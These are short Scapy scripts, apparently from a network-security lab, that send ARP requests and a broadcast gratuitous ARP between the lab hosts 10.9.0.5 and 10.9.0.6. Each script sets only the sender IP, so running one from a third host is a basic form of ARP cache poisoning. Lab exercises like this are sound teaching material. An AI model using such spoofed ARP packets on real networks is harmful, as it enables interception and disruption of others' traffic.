#Sent from B to A
from scapy.all import*
E = Ether(dst = "02:42:0a:09:00:05")
# op1 --> Request op2 --> Reply
A = ARP(op=1, psrc = "10.9.0.6", pdst = "10.9.0.5")
A.op = 1     
pkt = E/A
sendp(pkt)

#Sent from A to B
from scapy.all import*
E = Ether(dst = "02:42:0a:09:00:06")
# op1 --> Request op2 --> Reply
A = ARP(op=1, psrc = "10.9.0.5", pdst = "10.9.0.6")
A.op = 1     
pkt = E/A
sendp(pkt)

#Gratuitous 
from scapy.all import*
E = Ether(dst = "ff:ff:ff:ff:ff:ff")
# op1 --> Request op2 --> Reply
A = ARP(op=1, psrc = "10.9.0.5", pdst = "10.9.0.5")
A.op = 1     
pkt = E/A
sendp(pkt)
